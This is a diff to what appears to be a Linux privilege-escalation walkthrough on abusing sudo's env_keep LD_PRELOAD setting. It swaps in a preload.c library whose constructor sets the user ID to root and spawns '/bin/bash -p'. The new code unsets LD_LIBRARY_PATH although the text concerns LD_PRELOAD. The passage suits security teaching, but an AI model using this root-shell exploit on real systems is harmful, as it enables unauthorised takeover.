@@ -18,14 +18,16 @@ Note that the env\_keep option includes the LD\_PRELOAD environment variable.
 
 Create a file (preload.c) with the following contents:
 
-`#include <stdio.h>`\
-`#include <sys/types.h>`\
-`#include <stdlib.h>`\
-`void _init() {`\
-`unsetenv("LD_PRELOAD");`\
-`setresuid(0,0,0);`\
-`system("/bin/bash -p");`\
-`}`
+```
+#include <stdio.h>
+#include <stdlib.h>
+static void hijack() __attribute__((constructor));
+void hijack() {
+unsetenv("LD_LIBRARY_PATH");
+setresuid(0,0,0);
+system("/bin/bash -p");
+}
+```
 
 Compile preload.c to preload.so:
 
